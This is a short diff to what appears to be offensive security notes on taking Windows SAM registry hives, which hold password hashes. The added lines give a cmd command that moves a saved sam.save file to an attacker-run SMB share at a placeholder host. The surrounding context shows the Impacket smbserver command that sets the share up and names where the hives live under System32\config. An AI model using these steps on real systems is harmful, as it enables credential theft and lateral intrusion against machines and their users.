@@ -12,7 +12,11 @@ Set up an smbserver for transfer
 ```bash
 python3 smbserver.py --smb2support SHARENAME /path/to/save
 ```
-download the files on 
+download the files on attacker:
+```cmd 
+move sam.save \\<hoost ip>\SHARENAME
+```
+
 - They are `registry hive files`
 - They live under `C:\Windows\System32\config`
 	- `C:\Windows\System32\config\SAM`
